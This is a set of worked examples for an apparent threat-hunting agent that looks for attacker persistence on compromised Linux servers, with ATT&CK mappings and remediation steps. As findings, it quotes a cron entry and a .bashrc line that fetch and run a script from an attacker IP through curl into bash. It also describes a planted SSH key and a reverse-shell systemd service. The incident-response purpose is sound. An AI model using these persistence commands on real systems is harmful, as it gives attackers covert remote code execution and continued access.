# Persistence Hunter — Worked Examples

Externalized from the agent definition per the few-shot-examples rule (#1587).

### Example 1: Single Cron Backdoor (Simple)

**Scenario**: After a web compromise, sweep for attacker persistence.

**Finding**:
```bash
cat /etc/cron.d/php-update
# Content:
* * * * * www-data curl -s http://185.220.101.47/beacon.sh | bash
```

**Documentation**:
- Location: `/etc/cron.d/php-update`
- Created: March 15, 2024 03:12 UTC (confirmed by mtime, 38 minutes after web shell activity in logs)
- Owner: root (but executes as www-data)
- Content: Downloads and executes shell script every minute from attacker C2
- ATT&CK: T1053.003 — Scheduled Task/Job: Cron
- Remediation: Remove `/etc/cron.d/php-update`, kill any running curl/bash processes spawned by it, block the C2 IP at the perimeter

---

### Example 2: Layered Persistence (Moderate)

**Scenario**: Hunt for persistence on a server with a confirmed long-dwell intrusion (30 days).

**Findings** (attacker installed 4 mechanisms):

1. **Cron** (T1053.003): `/etc/cron.d/logrotate-bk` — curl-to-bash beacon, created Day 1
2. **SSH Key** (T1098.004): Attacker public key added to `/root/.ssh/authorized_keys`, creation timestamp matches initial compromise
3. **Systemd Service** (T1543.002): `/etc/systemd/system/cache-manager.service` — runs `/usr/local/bin/.cachemanager` on boot, binary is a reverse shell stub
4. **Login Script** (T1546.004): `/root/.bashrc` — appended line: `(curl -s http://185.220.101.47/check &)` — executes on every root interactive login

**Finding**: Four independent persistence mechanisms installed across the dwell period. Attacker established redundancy — removing any single mechanism would not have ended access. All four must be removed atomically, followed by a full password and key rotation, before the system is considered clean.
